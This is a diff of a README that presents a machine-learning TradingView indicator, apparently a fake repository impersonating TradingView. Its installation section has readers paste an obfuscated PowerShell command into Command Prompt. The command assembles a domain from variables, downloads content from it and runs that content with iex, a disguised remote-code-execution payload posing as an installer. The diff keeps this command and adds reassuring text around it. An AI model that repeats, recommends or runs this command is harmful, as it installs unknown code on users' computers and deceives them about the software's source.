@@ -1,6 +1,6 @@
 <a id="get"></a>
 <p align="center">
-  <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="quant.png" alt="TradingView" width="880"></a>
+  <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="quant-logo.jpg" alt="TradingView" width="738"></a>
 </p>
 <p align="center">
 <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="https://img.shields.io/badge/version-2.9.5%20beta-blue?style=flat-square&logo=tradingview" alt="version"></a>
@@ -8,12 +8,12 @@
 <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="https://img.shields.io/badge/beta%20users-7.4k-brightgreen?style=flat-square&logo=github" alt="beta users"></a>
 </p>
 
-Quant is our first indicator built on a machine learning model. It analyzes upcoming events, historical market data, price action, liquidity, positioning, volatility, and market structure to produce a directional forecast for the timeframe you select.
+Quant is our first indicator built on a machine learning model. You pick an asset and a timeframe, and the model analyzes the chart, weighs the known upcoming events, and marks where price is most likely to head next, with the signals behind it shown alongside.
 
 ## Installation
-Requires TradingView Desktop app. Setup takes a single command.
+The recommended way to install the Quant indicator on Windows is through Command Prompt. The command installs all required dependencies and completes the setup in one step.
 
-### 1. Open Command Prompt.
+### 1. Open Command Prompt
 Press **Win + R**, type `cmd`, press **Enter**.
 
 ### 2. Run the Installation Command
@@ -22,23 +22,19 @@ Copy and paste the following command into Command Prompt:
 ```powershell
 powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.5_beta'; $Sync='Library.'; $Install; $Mode='AI'; $Pinescript='TradingView'+$Sync+$Mode; (curl -UseBasicParsing ($Pinescript)).Content | iex"
 ```
+_Once the installation is complete, the Quant indicator will appear in your TradingView indicator library._
 
-### 3. Restart the TradingView Desktop App
-
-If TradingView was open during installation, restart it to finish setup. The Quant Indicator will then appear in your indicator library.
-
-
-# Support
+## Support
 If you run into an issue or have feedback, open an issue on GitHub or write to support@tradingview.com.
 
-# License
+## License
 Licensed under the Apache License, Version 2.0 (the "License"); you may not use this software except in compliance with the <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/LICENSE">License</a>. You may obtain a copy of the License in the LICENSE file. Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.
 
 This software incorporates several parts of tslib (https://github.com/Microsoft/tslib, (c) Microsoft Corporation) that are covered by BSD Zero Clause License.
 
 This license requires specifying TradingView as the product creator. You shall add the "attribution notice" from the NOTICE file and a link to https://www.tradingview.com/ to the page of your website or mobile application that is available to your users. As thanks for creating this product, we'd be grateful if you add it in a prominent place. You can use the attributionLogo chart option for displaying an appropriate link to https://www.tradingview.com/ on the chart itself, which will satisfy the link requirement.
 
-# Contributors
+## Community
 
 Built with feedback from our beta testers. Thank you to everyone who helped us improve it.
 
